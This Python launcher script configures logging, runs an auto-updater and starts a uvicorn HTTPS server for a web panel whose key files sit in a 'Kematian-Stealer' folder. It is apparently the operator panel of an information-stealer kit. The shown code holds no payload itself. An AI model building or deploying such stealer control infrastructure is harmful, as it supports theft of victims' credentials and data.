import sys
import logging
import uvicorn
import webbrowser

from rich.logging import RichHandler

from rich import print


FORMAT = "%(message)s"
logging.basicConfig(
    level="INFO",
    format=FORMAT,
    handlers=[RichHandler(rich_tracebacks=False, markup=True, show_time=False)],
)

logger = logging.getLogger("uvicorn")
logger.handlers = []
logger.propagate = False
logger.setLevel(logging.INFO)
handler = RichHandler(rich_tracebacks=False, markup=True, show_time=False)
handler.setFormatter(logging.Formatter(FORMAT))
logger.addHandler(handler)

from panel.ui.modules.updater.auto_updater import AutoUpdater

updater = AutoUpdater()
updater.update()


from panel.server import *

if __name__ == "__main__":
    print(
        "[bold green on black blink]If you are using this for the first time, please make sure to read the README.md file before proceeding![/bold green on black blink]"
    )

    chosen_port = current_settings.get_setting("port")
    webbrowser.open(f"https://127.0.0.1:{chosen_port}")

    # im sick of the app closing out on kids without a error being shows so we gotta do this now
    try:
        uvicorn.run(
            app,
            host="0.0.0.0",  # Actually needed for some preconfigured RDPs that only needs a port to be opened in Windows Firewall
            port=int(chosen_port),
            ssl_keyfile=os.path.join(good_dir, "Kematian-Stealer", "keyfile.pem"),
            ssl_certfile=os.path.join(good_dir, "Kematian-Stealer", "certfile.pem"),
            reload=False,
            log_config=None,  # we need this to disable the default uvicorn logger
        )

    except Exception as e:

        logger.error(f"An error occurred: {e}")
        logger.error("Exiting...")
        input("Press enter to exit...")
        sys.exit(1)
